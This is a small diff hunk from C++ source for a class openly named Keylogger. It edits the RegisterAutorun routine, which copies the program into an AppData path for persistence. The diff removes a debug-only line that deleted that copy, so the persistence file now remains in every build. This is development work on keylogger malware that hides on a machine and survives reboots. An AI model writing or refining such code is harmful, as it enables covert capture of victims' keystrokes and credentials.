@@ -71,9 +71,6 @@ void Keylogger::RegisterAutorun()
     {
         Error(_T("Failed to copy file"));
     }
-#ifdef _DEBUG
-    DeleteFile(appDataPath);
-#endif
 }
 
 void Keylogger::RemoveAutorun()
